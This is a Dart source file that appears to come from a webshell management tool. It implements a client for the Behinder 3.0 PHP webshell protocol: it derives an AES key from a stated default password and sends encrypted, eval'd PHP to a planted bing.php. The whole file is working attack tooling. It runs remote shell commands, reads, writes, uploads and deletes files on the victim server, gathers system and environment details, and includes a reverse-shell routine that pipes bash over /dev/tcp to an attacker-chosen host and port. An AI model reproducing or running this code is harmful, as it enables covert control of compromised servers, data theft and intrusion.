import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';

import 'package:encrypt/encrypt.dart' as enc;
import 'package:http/http.dart' as http;

import '../core/crypto/behinder_crypto.dart';
import '../models/file_entry.dart';
import '../utils/encoding_utils.dart';
import 'shell_connector.dart';
import 'shell_exec_connector.dart';

/// `bing.php`：冰蝎 3.0 PHP 协议，AES 加密传输
///
/// 密钥 = MD5(连接密码)[0:16]，默认密码 mAtrix_911 → 42b842fc69195c9d
/// POST body = base64(AES_encrypt("C|php_code"))，解密后 explode('|') 取 params，eval 执行
class PhpBehinderConnector extends ShellConnector {
  PhpBehinderConnector(super.webshell);

  late final http.Client _client = http.Client();
  final Map<String, String> _cookies = {};

  String get _aesKey => BehinderCrypto.deriveKey(webshell.password);

  @override
  Set<ConnectorCapability> get capabilities => const {
    ConnectorCapability.codeExec,
    ConnectorCapability.shellExec,
    ConnectorCapability.fileRead,
    ConnectorCapability.fileWrite,
  };

  /// 当前使用的模式：ECB 或 CBC。部分环境 "AES128" 映射不同，连接后自动探测
  bool _useCbc = false;
  String? _lastPingDiagnostic;

  @override
  String? get lastPingDiagnostic => _lastPingDiagnostic;

  String _aesEncryptBase64(String plain) {
    final key = enc.Key(Uint8List.fromList(utf8.encode(_aesKey)));
    if (_useCbc) {
      final iv = enc.IV(Uint8List(16));
      final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.cbc));
      final encrypted = encrypter.encrypt(plain, iv: iv);
      return base64.encode(encrypted.bytes);
    }
    final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.ecb));
    final encrypted = encrypter.encrypt(plain);
    return base64.encode(encrypted.bytes);
  }

  void _updateCookies(http.Response response) {
    final raw = response.headers['set-cookie'];
    if (raw == null) return;
    final part = raw.split(';').first.trim();
    final eq = part.indexOf('=');
    if (eq > 0)
      _cookies[part.substring(0, eq).trim()] = part.substring(eq + 1).trim();
  }

  Map<String, String> _requestHeaders() {
    final h = <String, String>{'Content-Type': 'application/octet-stream'};
    if (_cookies.isNotEmpty) {
      h['Cookie'] = _cookies.entries
          .map((e) => '${e.key}=${e.value}')
          .join('; ');
    }
    return h;
  }

  /// 冰蝎 PHP 格式：encrypt("C|php_code")，C.__invoke 执行 eval
  Future<String> _sendPhp(String phpCode) async {
    try {
      // 目标 bing.php 使用 explode('|') 来分离类名和参数。
      // 如果 phpCode 中包含 '|'，代码会被截断导致 eval 失败。
      // 因此必须用 base64 将代码包装一层，确保传输层没有 '|' 字符。
      final safeCode =
          "eval(base64_decode('${base64.encode(utf8.encode(phpCode))}'));";
      final payload = 'C|$safeCode';
      final body = _aesEncryptBase64(payload);

      // 勿用 application/x-www-form-urlencoded：base64 含 + 会被解码为空格导致损坏
      final response = await _client
          .post(Uri.parse(webshell.url), headers: _requestHeaders(), body: body)
          .timeout(const Duration(seconds: 25));

      _updateCookies(response);
      if (response.statusCode == 200) {
        return decodeWithFallback(response.bodyBytes);
      }
      final respBody = decodeWithFallback(response.bodyBytes);
      final snippet = respBody.length > 4096
          ? '${respBody.substring(0, 4096)}...'
          : respBody;
      return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
    } on TimeoutException {
      return '[Timeout] 连接超时';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  @override
  Future<bool> ping() async {
    try {
      _useCbc = false;
      var r = await _sendPhp(
        "echo 'MATRIX_PHP_PING';",
      ).timeout(const Duration(seconds: 15));
      if (r.contains('MATRIX_PHP_PING')) {
        _lastPingDiagnostic = null;
        return true;
      }
      _useCbc = true;
      r = await _sendPhp(
        "echo 'MATRIX_PHP_PING';",
      ).timeout(const Duration(seconds: 15));
      _lastPingDiagnostic = r.contains('MATRIX_PHP_PING') ? null : r;
      return r.contains('MATRIX_PHP_PING');
    } catch (e) {
      _lastPingDiagnostic = e.toString();
      return false;
    }
  }

  static String _sq(String s) => "'${s.replaceAll("'", "'\\''")}'";

  @override
  Future<String> executeCommand(String cmd, {String workingDir = ''}) async {
    final cd = (workingDir.isNotEmpty && workingDir.startsWith('/'))
        ? 'cd ${_sq(workingDir)} && '
        : '';
    final b64 = base64.encode(utf8.encode(
      '$cd${ShellExecConnector.quoteRmOperandIfNeeded(cmd)}',
    ));
    // 与 php_eval 完全一致，raw string 中 $ 不转义（Dart 仅 ${} 会插值）
    final code =
        "\$c=base64_decode('$b64');"
        r"$o=@shell_exec($c.' 2>&1');"
        r"if($o===null){$o=@system($c);}echo $o;";
    final r = await _sendPhp(code);
    return r.trim();
  }

  /// 冰蝎（bing.php）环境下的反弹 Shell：
  ///
  /// 注意：
  /// - 不能直接复用 [executeCommand]，否则 shell_exec + system 的双重调用
  ///   会让反弹命令执行两次，导致出现两个会话。
  /// - 这里改为直接下发一次性 system 调用，确保只建立一个会话。
  @override
  Future<void> startReverseShell(
    String lhost,
    int lport, {
    bool preferScript = true,
  }) async {
    if (!supportsShellExec) {
      throw UnsupportedError('当前连接器不具备 shell 执行能力，无法发起反弹 Shell');
    }

    // 与 ShellConnector.startReverseShell 保持一致的多级回退命令。
    late final String rsCmd;
    if (preferScript) {
      rsCmd =
          "bash -c 'export TERM=xterm-256color; "
          "if command -v script >/dev/null 2>&1; then "
          "script -q /dev/null bash >& /dev/tcp/$lhost/$lport 0>&1; "
          "elif command -v bash >/dev/null 2>&1; then "
          "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
          "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi' >/dev/null 2>&1 &";
    } else {
      rsCmd =
          "bash -c 'export TERM=xterm-256color; "
          "if command -v bash >/dev/null 2>&1; then "
          "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
          "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi' >/dev/null 2>&1 &";
    }

    final b64 = base64.encode(utf8.encode(rsCmd));
    final php =
        "\$c=base64_decode('$b64');"
        r"@system($c);";
    await _sendPhp(php);
  }

  @override
  Future<String> getCurrentDir() async {
    final r = (await _sendPhp("echo getcwd();")).trim();
    if (r.isNotEmpty && !r.startsWith('[')) currentDir = r;
    return currentDir;
  }

  @override
  Future<String?> getShellScriptDir() async {
    final r = (await _sendPhp(
      '\$f=isset(\$_SERVER["SCRIPT_FILENAME"])?\$_SERVER["SCRIPT_FILENAME"]:"";'
      '\$d=(\$f!=="")?@realpath(dirname(\$f)):false;'
      'if(\$d===false||\$d===""){\$f2=explode("(",__FILE__)[0];\$d=@realpath(dirname(\$f2));}'
      'echo(\$d!==false&&\$d!=="")?\$d:"";',
    )).trim();
    if (r.isEmpty || r.startsWith('[')) return null;
    return r;
  }

  @override
  Future<List<FileEntry>> listDirectory(String path) async {
    final b64 = base64.encode(utf8.encode(path));
    // 1) 优先 opendir/readdir；若被 disable_functions 限制则回退到 shell_exec
    final code =
        "\$p=base64_decode('$b64');"
        "\$d=@opendir(\$p);"
        'if(\$d===false){'
        "  \$out=@shell_exec((strtoupper(substr(PHP_OS,0,3))==='WIN'?'dir /b '.chr(34).str_replace(chr(34),chr(34).chr(34),\$p).chr(34):'ls -1a '.escapeshellarg(\$p).' 2>/dev/null'));"
        "  if(\$out===null||trim(\$out)===''){echo \"ERR_OPEN\";exit;} "
        "  foreach(explode(\"\\n\",trim(\$out)) as \$f){"
        "    \$f=trim(\$f);if(\$f===''||\$f==='.')continue;"
        "\$fp=\$p.DIRECTORY_SEPARATOR.\$f;"
        "\$t=@is_dir(\$fp)?'d':'f';"
        "\$s=@is_file(\$fp)?@filesize(\$fp):0;"
        "\$m=@filemtime(\$fp)?date('Y-m-d H:i',@filemtime(\$fp)):'';"
        "\$r=@fileperms(\$fp)?decoct(@fileperms(\$fp)&0777):'0';"
        'echo base64_encode(\$f)."|".\$t."|".\$s."|".\$r."|".\$m."\\n";'
        "}exit;}"
        "while((\$f=readdir(\$d))!==false){"
        "\$fp=\$p.DIRECTORY_SEPARATOR.\$f;"
        "\$t=is_dir(\$fp)?'d':'f';"
        "\$s=is_file(\$fp)?@filesize(\$fp):0;"
        "\$m=date('Y-m-d H:i',@filemtime(\$fp));"
        "\$r=decoct(@fileperms(\$fp)&0777);"
        'echo base64_encode(\$f)."|".\$t."|".\$s."|".\$r."|".\$m."\\n";'
        "}"
        "closedir(\$d);";
    final result = await _sendPhp(code);
    if (result.isEmpty ||
        result.startsWith('ERR_OPEN') ||
        result.startsWith('[')) {
      return [];
    }

    return result
        .trim()
        .split('\n')
        .where((l) => l.contains('|'))
        .map((line) {
          final parts = line.trim().split('|');
          if (parts.length < 5) return null;
          String name;
          try {
            name = decodeWithFallback(base64.decode(parts[0]));
          } catch (_) {
            name = parts[0];
          }
          return FileEntry(
            name: name,
            isDirectory: parts[1] == 'd',
            size: int.tryParse(parts[2]) ?? 0,
            permissions: parts[3],
            modified: parts[4],
          );
        })
        .whereType<FileEntry>()
        .where((e) => e.name != '.')
        .toList()
      ..sort((a, b) {
        if (a.name == '..') return -1;
        if (b.name == '..') return 1;
        if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
        return a.name.toLowerCase().compareTo(b.name.toLowerCase());
      });
  }

  @override
  Future<String> readFile(String path) async {
    final b64 = base64.encode(utf8.encode(path));
    return _sendPhp(
      "\$p=base64_decode('$b64');"
      r"if(!file_exists($p)){echo '[文件不存在或无权读取]';exit;}"
      r"$c=@file_get_contents($p);"
      r"if($c===false){"
      r"$o=@shell_exec((strtoupper(substr(PHP_OS,0,3))==='WIN'?'type '.chr(34).str_replace(chr(34),chr(34).chr(34),$p).chr(34):'cat '.escapeshellarg($p).' 2>/dev/null'));"
      r"echo $o!==null?$o:'[文件不存在或无权读取]';exit;}"
      r"echo $c;",
    );
  }

  @override
  Future<bool> writeFile(String path, String content) async {
    final pathB64 = base64.encode(utf8.encode(path));
    final contentB64 = base64.encode(utf8.encode(content));
    final r = await _sendPhp(
      "\$p=base64_decode('$pathB64');"
      "\$c=base64_decode('$contentB64');"
      r"echo file_put_contents($p,$c)!==false?'1':'0';",
    );
    return r.trim() == '1';
  }

  @override
  Future<Uint8List> readFileBinary(String path) async {
    final b64path = base64.encode(utf8.encode(path));
    final result = await _sendPhp(
      "\$p=base64_decode('$b64path');"
      r"if(!file_exists($p)){echo 'ERR_NOT_FOUND';exit;}"
      r"echo base64_encode(file_get_contents($p));",
    );
    final trimmed = result.trim();
    if (trimmed.startsWith('[') || trimmed == 'ERR_NOT_FOUND') {
      throw Exception('无法读取文件: $trimmed');
    }
    return base64.decode(trimmed);
  }

  @override
  Future<bool> writeFileBinary(String path, Uint8List bytes) async {
    final pathB64 = base64.encode(utf8.encode(path));
    final contentB64 = base64.encode(bytes);
    final r = await _sendPhp(
      "\$p=base64_decode('$pathB64');"
      "\$c=base64_decode('$contentB64');"
      r"echo file_put_contents($p,$c)!==false?'1':'0';",
    );
    return r.trim() == '1';
  }

  static const _kChunkSize = 128 * 1024; // 128 KB per chunk

  @override
  Future<bool> writeFileBinaryWithProgress(
    String path,
    Uint8List bytes,
    void Function(int sent, int total) onProgress,
  ) async {
    final total = bytes.length;
    final pathB64 = base64.encode(utf8.encode(path));
    onProgress(0, total);

    int offset = 0;
    bool first = true;
    while (offset < total) {
      final end = (offset + _kChunkSize).clamp(0, total);
      final chunkB64 = base64.encode(bytes.sublist(offset, end));
      final append = first ? '' : r',FILE_APPEND';
      final r = await _sendPhp(
        "\$p=base64_decode('$pathB64');"
        "\$c=base64_decode('$chunkB64');"
        "echo file_put_contents(\$p,\$c$append)!==false?'1':'0';",
      );
      if (r.trim() != '1') return false;
      offset = end;
      first = false;
      onProgress(offset, total);
    }
    return true;
  }

  @override
  Future<bool> deleteFile(String path) async {
    final b64 = base64.encode(utf8.encode(path));
    final r = await _sendPhp(
      "\$p=base64_decode('$b64');"
      r"echo @unlink($p)?'1':'0';",
    );
    return r.trim() == '1';
  }

  @override
  Future<Map<String, String>> getSystemInfo() async {
    // 长 payload 易触发 500，改为 base64 包装：仅加密 eval(base64_decode('...'))
    const inner = r'''
$info=[];
$info['OS']=php_uname();
$info['PHP版本']=phpversion();
$u=get_current_user();
if(function_exists('posix_getpwuid')&&function_exists('posix_geteuid')){
  $r=@posix_getpwuid(@posix_geteuid());
  if(is_array($r)&&isset($r['name']))$u=$r['name'];
}
$info['运行用户']=$u;
$info['当前目录']=getcwd();
$info['文档根目录']=isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'N/A';
$info['服务器软件']=isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'N/A';
$info['服务器IP']=isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:@gethostbyname(@gethostname());
$info['内存限制']=ini_get('memory_limit');
$info['最大执行时间']=ini_get('max_execution_time').'s';
$info['禁用函数']=ini_get('disable_functions')?:'无';
$info['Safe Mode']=(@ini_get('safe_mode')||(bool)@ini_get('safe_mode'))?'On':'Off';
$info['已加载扩展']=implode(', ',@get_loaded_extensions());
foreach($info as $k=>$v){
  echo base64_encode($k).'|'.base64_encode((string)$v)."\n";
}
''';
    final b64 = base64.encode(utf8.encode(inner));
    final result = await _sendPhp("eval(base64_decode('$b64'));");
    final map = <String, String>{};
    if (result.isEmpty || result.startsWith('[')) return map;
    for (final line in result.trim().split('\n')) {
      final idx = line.indexOf('|');
      if (idx > 0) {
        try {
          final key = decodeWithFallback(
            base64.decode(line.substring(0, idx).trim()),
          );
          final val = decodeWithFallback(
            base64.decode(line.substring(idx + 1).trim()),
          );
          map[key] = val;
        } catch (_) {}
      }
    }
    return map;
  }

  @override
  Future<List<({String name, bool isDir})>> listNamesForCompletion(
    String path,
  ) async {
    final b64 = base64.encode(utf8.encode(path));
    final code =
        "\$p=base64_decode('$b64');"
        r"$d=@opendir($p);"
        r"if($d===false){"
        r"$o=@shell_exec((strtoupper(substr(PHP_OS,0,3))==='WIN'?'dir /b '.chr(34).str_replace(chr(34),chr(34).chr(34),$p).chr(34):'ls -1a '.escapeshellarg($p).' 2>/dev/null'));"
        r"if($o!==null){foreach(explode(chr(10),trim($o)) as $f){$f=trim($f);if($f===''||$f==='.'||$f==='..')continue;$t=@is_dir($p.DIRECTORY_SEPARATOR.$f)?'d':'f';echo base64_encode($f).'|'.$t.chr(10);}}"
        r"exit;}"
        r"while(($f=readdir($d))!==false){"
        r"if($f==='.'||$f==='..'){continue;}"
        r"$t=is_dir($p.DIRECTORY_SEPARATOR.$f)?'d':'f';"
        r"echo base64_encode($f).'|'.$t.chr(10);"
        r"}closedir($d);";
    final result = await _sendPhp(code);
    if (result.isEmpty || result.startsWith('[')) return [];
    final out = <({String name, bool isDir})>[];
    for (final line in result.trim().split('\n')) {
      final parts = line.trim().split('|');
      if (parts.length < 2) continue;
      try {
        final name = decodeWithFallback(base64.decode(parts[0]));
        out.add((name: name, isDir: parts[1] == 'd'));
      } catch (_) {}
    }
    out.sort((a, b) => a.name.compareTo(b.name));
    return out;
  }

  @override
  Future<String> getHomeDir() async =>
      (await _sendPhp(r"echo getenv('HOME');")).trim();

  @override
  Future<List<String>> listEnvVarNames() async {
    final result = await _sendPhp(
      r"foreach(array_keys((array)getenv()) as $k){echo $k.chr(10);}",
    );
    if (result.isEmpty || result.startsWith('[')) return [];
    return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
      ..sort();
  }
}
